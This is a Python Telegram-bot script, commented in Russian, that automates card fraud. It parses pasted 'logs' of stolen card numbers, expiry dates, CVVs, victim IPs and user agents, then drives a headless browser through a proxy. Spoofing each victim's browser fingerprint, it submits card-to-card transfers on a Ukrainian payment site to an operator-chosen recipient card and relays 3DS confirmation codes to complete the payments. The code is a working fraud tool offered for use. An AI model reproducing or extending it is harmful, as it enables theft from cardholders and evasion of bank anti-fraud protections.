import os
import re
import sqlite3
import asyncio
import random
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.utils import executor
from playwright.async_api import async_playwright

# ===================== КОНФИГ =====================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
PROXY_URL = os.getenv("PROXY_URL", "socks5://user:pass@ip:port")
RECIPIENT_CARD = os.getenv("RECIPIENT_CARD", "5168755432101234")
DEFAULT_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36"
DB_PATH = "sessions.db"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

# ===================== БАЗА ДАННЫХ =====================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        card_from TEXT, expiry TEXT, cvv TEXT,
        ip TEXT, user_agent TEXT,
        amount INTEGER,
        card_to TEXT,
        status TEXT,
        msg_amount_id INTEGER,
        msg_code_id INTEGER,
        timestamp TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )""")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('card_to', ?)", (RECIPIENT_CARD,))
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy', ?)", (PROXY_URL,))
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('default_ua', ?)", (DEFAULT_UA,))
    conn.commit()
    conn.close()

def get_setting(key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def set_setting(key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def create_session(data):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""INSERT INTO sessions
        (card_from, expiry, cvv, ip, user_agent, amount, card_to, status, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (data['card'], data['expiry'], data['cvv'], data['ip'],
         data['user_agent'], None, get_setting('card_to'), 'waiting_amount', datetime.now().isoformat()))
    session_id = c.lastrowid
    conn.commit()
    conn.close()
    return session_id

def update_session(session_id, field, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(f"UPDATE sessions SET {field} = ? WHERE id = ?", (value, session_id))
    conn.commit()
    conn.close()

def get_session(session_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM sessions WHERE id = ?", (session_id,))
    row = c.fetchone()
    conn.close()
    return row

# ===================== ПАРСЕР ЛОГА =====================
def parse_log(text):
    data = {
        "card": None, "expiry": None, "cvv": None,
        "ip": None, "user_agent": None
    }
    lines = text.split("\n")
    for line in lines:
        if "Номер:" in line or "💳" in line:
            match = re.search(r"\d{15,16}", line)
            if match: data["card"] = match.group()
        if "Истекает:" in line or "📅" in line:
            match = re.search(r"\d{2}[/-]?\d{2,4}", line)
            if match: data["expiry"] = match.group()
        if "CVV:" in line or "🎳" in line:
            match = re.search(r"\b\d{3}\b", line)
            if match: data["cvv"] = match.group()
        if "IP:" in line or "🌍" in line:
            match = re.search(r"\d+\.\d+\.\d+\.\d+", line)
            if match: data["ip"] = match.group()
        if "User-Agent:" in line or "👻" in line:
            parts = line.split(":", 1)
            if len(parts) > 1: data["user_agent"] = parts[1].strip()
    if not data["ip"]: data["ip"] = get_setting('proxy')
    if not data["user_agent"]: data["user_agent"] = get_setting('default_ua')
    return data

# ===================== ЭМУЛЯЦИЯ ПЛАТЕЖА =====================
async def emulate_payment(session_id, code=None):
    session = get_session(session_id)
    if not session:
        return "Сессия не найдена"
    card, expiry, cvv, ip, ua, amount, card_to = session[1], session[2], session[3], session[4], session[5], session[6], session[7]
    expiry = expiry.replace("/", "").strip()
    if len(expiry) == 4:
        expiry = expiry[:2] + "/" + expiry[2:]
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            proxy={"server": ip} if ip != "auto" else None
        )
        context = await browser.new_context(
            user_agent=ua or get_setting('default_ua'),
            locale="uk-UA",
            timezone_id="Europe/Kyiv"
        )
        page = await context.new_page()
        # ==== ЗАПОЛНЕНИЕ ФОРМЫ iPay (пример) ====
        await page.goto("https://ipay.ua/card2card")
        await page.fill('input[name="card_from"]', card)
        await page.fill('input[name="expiry"]', expiry)
        await page.fill('input[name="cvv"]', cvv)
        await page.fill('input[name="card_to"]', card_to)
        await page.fill('input[name="amount"]', str(amount))
        await page.click('button[type="submit"]')
        await asyncio.sleep(2)
        # ==== ПРОВЕРКА 3DS ====
        if await page.is_visible('input[name="code"]'):
            if code:
                await page.fill('input[name="code"]', code)
                await page.click('button[type="submit"]')
                await asyncio.sleep(2)
                return "✅ Платёж подтверждён!"
            else:
                # Ждём 60 сек и нажимаем "Отправить код по СМС"
                await asyncio.sleep(60)
                if await page.is_visible('button:has-text("Отправить код")'):
                    await page.click('button:has-text("Отправить код")')
                    return "waiting_code"
        # ==== УСПЕХ ====
        if await page.is_visible('.success'):
            return "✅ Платёж выполнен успешно!"
        # ==== ОШИБКА ====
        error_text = await page.text_content('.error')
        return f"❌ Ошибка: {error_text or 'неизвестная'}"

# ===================== ОБРАБОТЧИКИ СООБЩЕНИЙ =====================
@dp.message_handler(commands=['start'])
async def start_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    await msg.reply("🏦 Бот активирован. Шли лог с данными карты.")

@dp.message_handler(commands=['admin'])
async def admin_panel(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💳 Сменить карту", callback_data="change_card"),
        InlineKeyboardButton("💰 Сменить сумму", callback_data="change_amount"),
        InlineKeyboardButton("🔄 Сменить прокси", callback_data="change_proxy"),
        InlineKeyboardButton("📋 Логи", callback_data="show_logs"),
    )
    await msg.reply("🏦 Админ-панель", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data.startswith("change_"))
async def settings_callback(callback: types.CallbackQuery):
    action = callback.data.split("_")[1]
    if action == "card":
        await callback.message.reply("Введите новый номер карты получателя:")
    elif action == "amount":
        await callback.message.reply("Введите новую сумму по умолчанию (UAH):")
    elif action == "proxy":
        await callback.message.reply("Введите новый прокси (формат socks5://user:pass@ip:port):")
    await callback.answer()

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text and len(msg.text.split()) == 1)
async def handle_settings_input(msg: types.Message):
    # Логика обработки ввода настроек (упрощённо)
    if msg.reply_to_message and "номер карты" in msg.reply_to_message.text:
        set_setting('card_to', msg.text)
        await msg.reply("✅ Карта получателя обновлена!")
    elif msg.reply_to_message and "сумму" in msg.reply_to_message.text:
        if msg.text.isdigit():
            set_setting('default_amount', msg.text)
            await msg.reply(f"✅ Сумма по умолчанию обновлена: {msg.text} UAH")
    elif msg.reply_to_message and "прокси" in msg.reply_to_message.text:
        set_setting('proxy', msg.text)
        await msg.reply("✅ Прокси обновлён!")

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text and len(msg.text) > 20)
async def handle_log(msg: types.Message):
    data = parse_log(msg.text)
    if not data["card"] or not data["expiry"] or not data["cvv"]:
        await msg.reply("❌ Не удалось распознать данные. Проверь формат.")
        return
    session_id = create_session(data)
    update_session(session_id, 'msg_amount_id', msg.message_id)
    await msg.reply(
        f"✅ Данные распознаны:\n"
        f"💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
        f"📅 Срок: {data['expiry']}\n"
        f"🎳 CVV: ***\n"
        f"🌍 IP: {data['ip']}\n"
        f"👻 UA: {data['user_agent'][:30]}...\n\n"
        f"💰 Введите сумму удара (ответьте на это сообщение):"
    )

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message and 'сумму удара' in msg.reply_to_message.text)
async def handle_amount(msg: types.Message):
    if not msg.text.isdigit():
        await msg.reply("❌ Введи число!")
        return
    amount = int(msg.text)
    session_id = None
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id FROM sessions WHERE msg_amount_id = ? AND status = 'waiting_amount'", (msg.reply_to_message.message_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        await msg.reply("❌ Сессия не найдена.")
        return
    session_id = row[0]
    update_session(session_id, 'amount', amount)
    update_session(session_id, 'status', 'processing')
    await msg.reply("🚀 Начинаю эмуляцию платежа...")
    result = await emulate_payment(session_id)
    if result == "waiting_code":
        update_session(session_id, 'status', 'waiting_code')
        code_msg = await msg.reply("🔐 Требуется код подтверждения.\n📲 Введите 6-значный код (ответьте на это сообщение):")
        update_session(session_id, 'msg_code_id', code_msg.message_id)
    elif "✅" in result or "❌" in result:
        update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
        await msg.reply(result)

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message and 'код' in msg.reply_to_message.text)
async def handle_code(msg: types.Message):
    code = msg.text.strip()
    if not code.isdigit() or len(code) != 6:
        await msg.reply("❌ Код должен быть 6 цифр!")
        return
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id FROM sessions WHERE msg_code_id = ? AND status = 'waiting_code'", (msg.reply_to_message.message_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        await msg.reply("❌ Сессия не найдена.")
        return
    session_id = row[0]
    await msg.reply("🔄 Подтверждаю платёж...")
    result = await emulate_payment(session_id, code)
    update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
    await msg.reply(result)

# ===================== ЗАПУСК =====================
if __name__ == "__main__":
    init_db()
    executor.start_polling(dp, skip_updates=True)
